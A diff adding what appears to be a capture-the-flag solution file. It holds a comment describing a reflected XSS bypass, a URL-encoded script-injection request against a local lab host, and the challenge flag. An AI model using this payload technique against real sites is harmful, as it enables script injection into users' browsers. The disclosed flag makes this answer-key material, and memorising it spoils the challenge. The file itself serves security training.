@@ -1,0 +1,4 @@
+# Reflected XSS in /page?name= via backtick template literal bypass. Single quotes are stripped by the app but backticks are not filtered. Payload breaks out of input value attribute and injects a script tag. Returns CTF flag: flag{150348df-0912-4c0b-b000-65a0a48bf14a}
+
+GET /page?name=%22%3E%3Cscript%3Ealert(%60XSS%60)%3C%2Fscript%3E HTTP/1.1
+Host: 172.17.0.1:52527
